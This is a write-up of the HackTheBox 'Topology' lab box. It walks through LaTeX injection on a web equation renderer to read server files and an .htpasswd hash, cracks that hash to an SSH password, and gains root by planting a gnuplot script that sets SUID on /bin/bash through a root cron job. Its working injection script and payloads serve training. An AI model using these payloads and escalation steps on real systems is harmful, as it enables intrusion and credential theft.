---
title: "HTB Topology"
draft: false
description: ""
categories: ["HTB", "Linux"]
tags: ["htb-easy", "wfuzz", "LaTeX", "latex-injection", "inline-math-mode", "htpasswd", "gnuplot"]
date: 2023-11-04T17:58:58+05:30
summary: "Topology is an easy linux box featuring a web server with a vulnerable virtual host susceptible to LaTeX injection. This LaTeX injection allowed me to access and read files on the server, leading to the discovery of SSH login credentials. Lastly, I exploited a misconfiguration along with the functionality of gnuplot to execute system commands as the root user."
---



# Topology HTB

## Overview
---

> Topology is an easy linux box featuring a web server with a vulnerable virtual host susceptible to LaTeX injection. This LaTeX injection allowed me to access and read files on the server, leading to the discovery of SSH login credentials. Lastly, I exploited a misconfiguration along with a functionality of gnuplot to execute system commands as the root user.

---
## Enumeration
---

### Open Ports

I discovered two open port with nmap
- port 22 → Open SSH
- port 80 → Apache HTTP web server

```bash
#nmap  -p- -Pn -T4 --min-rate 1000 --max-retries 5 -oN "nmap/fullScan_10.129.138.193.nmap" "10.129.138.193"
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-22 05:45 EDT
Nmap scan report for 10.129.138.193
Host is up (0.063s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# nmap  -Pn -p"22,80" -sV -sC -T4 -oA "nmap/10.129.138.193" "10.129.138.193"
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-22 05:46 EDT
Nmap scan report for topology.htb (10.129.138.193)
Host is up (0.075s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 dcbc3286e8e8457810bc2b5dbf0f55c6 (RSA)
|   256 d9f339692c6c27f1a92d506ca79f1c33 (ECDSA)
|_  256 4ca65075d0934f9c4a1b890a7a2708d7 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Miskatonic University | Topology Group
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

### port 80 - HTTP

Unfortunately, the HTTP headers do not provide any valuable information.

```bash
> http -ph 10.129.138.193
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 2246
Content-Type: text/html
Date: Thu, 22 Jun 2023 09:51:28 GMT
ETag: "1a6f-5f27900124a8b-gzip"
Keep-Alive: timeout=5, max=100
Last-Modified: Tue, 17 Jan 2023 17:26:29 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding

```

The website appears to be the homepage of a Topology Group within the Mathematics department of a university. There are references to a domain, `topology.htb`, in the professor's email. The email format seems to follow the pattern of `{FirstNameInitial}{LastName}`. Additionally, there's a project that includes an href linking to a new virtual host, `latex.topology.htb`.

![index-page](./images/index-page.png)

The `http://latex.topology.htb` points to an index site containing mainly images, a few `tex` files, and an `equation.php` file. I also used `wfuzz` to search for other virtual hosts and found two more: `dev` and `stats`.

```bash
> wfuzz_subdomain_enum topology.htb --hh 6767
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://topology.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000019:   401        14 L     54 W       463 Ch      "dev"
000000061:   200        5 L      9 W        108 Ch      "stats"

Total time: 0
Processed Requests: 4989
Filtered Requests: 4987
Requests/sec.: 0

```

#### stats.topology.htb

The `dev` virtual host doesn't provide much; it just displays two images, and there's no content at `/files` either.

```bash
❯ http -pb stats.topology.htb
<center>
	<p><img src="files/network.png" /></p>
	<p>---</p>
	<p><img src="files/load.png" /></p>
</center>

```
#### dev.topology.htb

The `dev` virtual host returns a 401 error, likely because it requires credentials for access.

```bash
❯ http -ph dev.topology.htb
HTTP/1.1 401 Unauthorized
Connection: Keep-Alive
Content-Length: 463
Content-Type: text/html; charset=iso-8859-1
Date: Sun, 29 Oct 2023 09:11:45 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.41 (Ubuntu)
WWW-Authenticate: Basic realm="Under construction"
```
#### latex.topology.htb

I can input LaTeX content on this website, and it produces a PNG image of the equation. Unfortunately, I didn't find any significant information in the EXIF data of the generated images. The website also specifies that it exclusively supports _LaTeX one-liner inline math mode syntax_.

![latex-generator](./images/latex-generator.png)

Using the fractions LaTeX code, I can generate an image as shown in the output on the website.

![latex-image](./images/latex-image.png)

---
## Initial Foothold
---

Looking for potential ways to exploit the LaTeX rendering feature came across a method known as [LaTeX injection](https://book.hacktricks.xyz/pentesting-web/formula-doc-latex-injection#latex-injection) and a helpful [blog post](https://0day.work/hacking-with-latex/) on the topic.
To simplify the process, I've also wrote a Python script use the functionality via CLI.

```python
#!/usr/bin/env python

import re
import sys

import requests
import urllib3
import subprocess

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

payload = sys.argv[1]

url = "http://latex.topology.htb/equation.php"
proxies = {"http": "http://127.0.0.1:8080"}
# proxies = {"http": ""}

file_path = "output.png"

params = {"eqn": f"{payload}", "submit": ""}

try:
    session = requests.Session()

    response = session.get(url=url, params=params, proxies=proxies)
    if response.status_code == 200 and response.content:
        image_data = response.content
        with open(file_path, "wb") as file:
            file.write(image_data)

        print(f"Image downloaded and saved as '{file_path}'")
        subprocess.run(["xdg-open", file_path])
    else:
        print(f"Failed to retrieve the image with code: {response.status_code}")

    session.close()

except Exception as e:
    print(f"Exception raised: {e}")
```

Using this script, I can replicate the previous image.

```bash
❯ ./latex_injection.py '\frac{x+5}{y-3}'
Image downloaded and saved as 'output.png'
```

### File read using latex injection

I attempted to use `\input{}` to list the hostname, but it appears that it's blacklisted or restricted.

```bash
./latex_injection.py '\input{/etc/hostname}'
Image downloaded and saved as 'output.png'

```

![unsuccessful-latex-injection](./images/unsuccessful-latex-injection.png)

The `\lstinputlisting{}` syntax, although it returns a 200 status code, it contains null data. Multiline commands work, but they only return the first line of the file.

Since the website requires inline math mode, according to the [Overleaf documentation](https://www.overleaf.com/learn/latex/Mathematical_expressions#Inline_math_mode), which indicates that inline mode can be achieved by using the `$...$` delimiters. Given that only `lstinputlisting` returned a 200 response, I combined this with the delimiters and was able to read the file contents.

![file-read-hostname](./images/file-read-hostname.png)

In anticipation of working extensively with images, I [modified the Python script](https://gist.github.com/AbraXa5/5cb7300b4163b688b2c2b6a2207d4338) to use Tesseract to extract and read the contents of the image.

```python
# pipenv install pytesseract pillow requests
# sudo apt install tesseract-ocr
import pytesseract
from PIL import Image

def extract_text_from_image(image_file):
    try:
        image = Image.open(image_file)
        text = pytesseract.image_to_string(image)
        print(text)
    except FileNotFoundError:
        print(f"Image file '{image_file}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")
```

And it works as expected !

```bash
❯ pipenv run python latex_injection.py '$\lstinputlisting{/etc/hostname}$'
Image downloaded and saved as 'output.png'
topology
```

I found another user with a login shell, named `vdaisley` in the `/etc/passwd` file.

```bash
❯ pipenv run python latex_injection.py '$\lstinputlisting{/etc/passwd}$' | grep sh$
root:x:0:0: root:/root:/bin/bash
vdaisley:x:1007:1007: Vajramani Daisley ,W2 | —123,,:/home/ vdaisley :/ bin/bash
```

Now that I can read file contents, and considering that the `dev` subdomain accepts credentials through Basic authentication, I have the potential to read its `htaccess` and `htpasswd` files located in the `/var/www/dev/` directory.

```bash
❯ pipenv run python latex_injection.py '$\lstinputlisting{/etc/apache2/sites-enabled/000-default.conf}$' | grep DocumentRoot
        DocumentRoot    /var/www/html
        DocumentRoot    /var/www/latex
        DocumentRoot    /var/www/dev
        DocumentRoot    /var/www/stats
```

```bash
❯ pipenv run python latex_injection.py '$\lstinputlisting{/var/www/dev/.htaccess}$'
Image downloaded and saved as 'output.png'
AuthName ”Under construction”
AuthType Basic

AuthUserFile /var/www/dev/. htpasswd
Require valid—user
```

The `htpasswd` file stores usernames and their corresponding passwords for basic authentication of HTTP users. These passwords are typically encrypted using md5crypt format.

```bash
❯ pipenv run python latex_injection.py '$\lstinputlisting{/var/www/dev/.htpasswd}$'
Image downloaded and saved as 'output.png'
vdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO
```

I successfully cracked the hash using JTR and retrieved the credentials: `vdaisley:calculus20`. Using these credentials I can authenticate to the `dev` subdomain.

```bash
> echo 'vdaisley:$apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTYO' > hash.txt
❯ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
calculus20       (vdaisley)
1g 0:00:00:08 DONE (2023-10-29 23:27) 0.1234g/s 122927p/s 122927c/s 122927C/s calebd1..caitlyn09
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
❯ john hash.txt --show
vdaisley:calculus20
```

After authenticating with the cracked credentials on the `dev` virtual host, it seems to be an under-construction portfolio website with no other information.

![dev-vhost-authN](./images/dev-vhost-authN.png)

Luckily, the credentials are reused for SSH access and I can login as `vdaisley`.

```bash
> pc vdaisley:calculus20@topology.htb
[08:43:29] Welcome to pwncat 🐈!                                                                    __main__.py:164
[08:43:32] topology.htb:22: registered new host w/ db                                                manager.py:957
(local) pwncat$
(remote) vdaisley@topology:/home/vdaisley$ id
uid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)
(remote) vdaisley@topology:/home/vdaisley$
```

---
## Privilege Escalation
----

Unfortunately, the user `vdaisley` doesn't have any sudo privileges.

```bash
(remote) vdaisley@topology:/home/vdaisley$ sudo -l
[sudo] password for vdaisley:
Sorry, user vdaisley may not run sudo on topology.
```

I came across a directory named `gnuplot` in `/opt` owned by root. Interestingly, the directory has write permissions, but it doesn't have read permissions for other users.

```bash
(remote) vdaisley@topology:/home/vdaisley$ ls -la /opt/
total 12
drwxr-xr-x  3 root root 4096 May 19 13:04 .
drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..
drwx-wx-wx  2 root root 4096 Jun 14 07:45 gnuplot
```

Using [pspy](https://github.com/DominicBreuker/pspy) I discovered a cronjob running in the background. This cronjob seems to locate all files with the `.plt` extension within the `/opt/gnuplot` directory and subsequently executes them using the `gnuplot` utility.

```bash
2023/06/22 08:55:01 CMD: UID=0     PID=22771  | find /opt/gnuplot -name *.plt -exec gnuplot {} ;
2023/06/22 08:55:01 CMD: UID=0     PID=22772  | gnuplot /opt/gnuplot/loadplot.plt
2023/06/22 08:55:01 CMD: UID=0     PID=22776  | /bin/sh /opt/gnuplot/getdata.sh
```

According to the [gnuplot documentation](http://gnuplot.info/docs_5.5/loc18483.html), the system command can be used to execute system commands within gnuplot. Since I have write permissions to the `/opt/gnuplot/` directory, I can write to files in that directory.

```bash
(remote) vdaisley@topology:/opt$ echo "system 'chmod u+s /bin/bash'" > /opt/gnuplot/privEsc.plt
(remote) vdaisley@topology:/opt$ cat gnuplot/privEsc.plt
system 'chmod +s /bin/bash'
(remote) vdaisley@topology:/opt$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

When the cron job executes, it sets the SUID bit on `/bin/bash`. This SUID bit allows me to execute `/bin/bash` in privileged mode, effectively granting me root privileges.

```bash
(remote) vdaisley@topology:/opt$ bash -p
(remote) root@topology:/opt# id
uid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) egid=0(root) groups=0(root),1007(vdaisley)
(remote) root@topology:/opt# cd /root
(remote) root@topology:/root# ls -l
total 4
-rw-r----- 1 root root 33 Jun 22 06:06 root.txt
(remote) root@topology:/root#
```

**Pwned Topology!**

<!-- ![Pwned](https://i.imgur.com/PIcROPX.png) -->


# Related Links

- [Formula/CSV/Doc/LaTeX/GhostScript Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/formula-csv-doc-latex-ghostscript-injection#latex-injection)
- [Hacking with LaTeX |](https://0day.work/hacking-with-latex/)
- [Mathematical expressions - Overleaf, Online LaTeX Editor](https://www.overleaf.com/learn/latex/Mathematical_expressions#Inline_math_mode)
- [gnuplot.info docs - system](http://gnuplot.info/docs_5.5/loc18483.html)
